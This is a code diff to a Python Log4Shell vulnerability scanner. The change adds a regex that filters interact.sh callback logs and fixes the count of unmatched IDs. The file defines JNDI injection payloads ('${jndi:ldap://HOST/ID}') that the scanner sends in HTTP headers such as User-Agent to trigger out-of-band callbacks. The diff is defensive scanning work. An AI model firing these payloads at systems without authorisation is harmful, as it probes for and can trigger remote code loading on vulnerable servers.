@@ -2,6 +2,7 @@
 # coding=utf-8
 
 import argparse
+import re
 import time
 import uuid
 from termcolor import cprint
@@ -26,6 +27,7 @@ except Exception:
 TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
 INTERACTSH_PAYLOAD = "${jndi:ldap://HOST}"
 INTERACTSH_SERVER = "interact.sh"
+INTERACTSH_REGEX = re.compile("(\w)+\.\w+")
 HEADERS = [
     "User-Agent",
     "X-Api-Version",
@@ -319,11 +321,12 @@ def execute_interactsh(mappings, args):
     print()
     cprint("[*] Start verification", color="cyan", attrs=["bold", "underline"])
     logs = service.poll()
-    endpoints = {mappings[log["full-id"].split(".")[0]] for log in logs if log["full-id"].split(".")[0] in mappings}
+    ids = {log["full-id"].split(".")[0] for log in logs if log["full-id"] is not None and INTERACTSH_REGEX.match(log["full-id"])}
+    endpoints = {mappings[id] for id in ids if id in mappings}
 
-    if len(logs) > 0:
-        if len(endpoints) != len(logs):
-            cprint(f"[???] {len(logs) - len(endpoints)} missing correspondences between logs and ID", color="yellow")
+    if len(ids) > 0:
+        if len(endpoints) < len(ids):
+            cprint(f"[???] {len(ids) - len(endpoints)} missing correspondences between logs and ID", color="yellow")
 
         if len(endpoints) > 0:
             cprint("[!!!] Vulnerable endpoints found!", color="red", attrs=["bold"])
